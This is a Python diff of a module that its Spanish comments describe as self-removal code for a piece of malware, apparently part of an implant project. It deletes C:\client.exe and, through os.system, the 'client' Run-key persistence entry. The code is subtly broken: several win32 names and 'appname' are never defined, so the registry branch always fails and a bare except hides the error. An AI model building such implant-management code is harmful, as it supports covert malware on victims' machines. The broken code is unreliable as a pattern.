@@ -1,22 +1,35 @@
 
 # MODULO PARA AUTOREMOVER EL MALWARE -> CREADO POR KIRARI
 
+import os
 
 def windows_autoremover():
-	from win32api import RegOpenKeyEx
 
 	try:
+		from win32api import RegOpenKeyEx
 
-		SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+		try:
 
-		key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
-		RegDeleteValue(key, appname)
-		RegCloseKey(key)
+			SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 
-	except WindowsError:
-		return (False,"\n No se ha podido eliminar al bicho \n")
+			key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
+			RegDeleteValue(key, appname)
+			RegCloseKey(key)
 
-	return (False,"\n Bicho eliminado con exito \n")
+		except WindowsError:
+			return (False,"\n No se ha podido eliminar al bicho \n")
+
+		return (True,"\n Bicho eliminado con exito \n")
+
+	except:
+		destino = "C:\\client.exe"
+		if os.path.isfile(destino):
+			os.remove(destino)
+		
+		os.system('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /f')
+
+		return (True,"\n Bicho eliminado con exito \n")
+
 
 def linux_autoremover():
 	return (False,"\n No se ha encontrado un bicho implantado todavia \n")
